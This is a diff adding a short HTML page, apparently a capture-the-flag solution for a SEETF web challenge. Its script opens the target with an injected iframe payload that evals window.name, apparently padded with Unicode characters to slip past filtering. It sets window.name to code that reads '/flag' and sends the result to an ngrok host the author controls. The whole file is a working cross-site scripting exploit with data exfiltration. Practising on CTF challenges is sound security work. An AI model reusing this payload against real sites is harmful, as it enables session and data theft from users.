@@ -1,0 +1,11 @@
+<html>
+<body>
+    <script>
+        const OUR_URL = "https://ec43-175-156-124-45.ngrok-free.app"
+        window.open(
+            "http://wasm.web.seetf.sg:1337?note=<iframe onload=eval(window.name)>%C4%B0%C4%B0%C4%B0%C4%B0%C4%B0%C4%B0%C4%B0aa%02",
+            `fetch('/flag').then(r=>r.text()).then(d=>fetch('${OUR_URL}/?flag='+d))`
+        )
+    </script>
+</body>
+</html>
